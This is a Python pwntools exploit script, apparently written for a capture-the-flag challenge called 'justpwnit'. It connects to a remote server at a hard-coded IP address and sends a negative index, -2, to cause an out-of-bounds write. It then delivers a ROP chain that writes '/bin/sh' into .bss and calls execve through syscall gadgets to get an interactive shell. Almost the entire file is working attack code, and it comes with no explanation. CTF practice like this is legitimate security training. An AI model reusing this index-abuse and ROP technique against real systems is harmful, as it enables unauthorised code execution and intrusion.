#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./justpwnit"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("168.119.108.148", 11010)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *set_element+190
        b *0x401001
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

#bss_addr = elf.bss()

rop = b'A' * 8
# write '/bin/sh' in .bss
rop += p64(0x401001) # pop rax; ret
rop += b'/bin/sh\0'
rop += p64(0x401b0d) # pop rdi; ret
rop += p64(elf.bss())
rop += p64(0x401ce7) # mov qword ptr [rdi], rax; ret
# execve('/bin/sh', NULL, NULL)
rop += p64(0x401001) # pop rax; ret
rop += p64(0x3b)
rop += p64(0x401b0d) # pop rdi; ret
rop += p64(elf.bss())
rop += p64(0x4019a3) # pop rsi; ret
rop += p64(0)
rop += p64(0x403d23) # pop rdx; ret
rop += p64(0)
rop += p64(0x403888) # syscall; ret

p.recvuntil("Index")
p.sendline("-2")
p.recvuntil("Data:")
p.sendline(rop)

p.interactive()
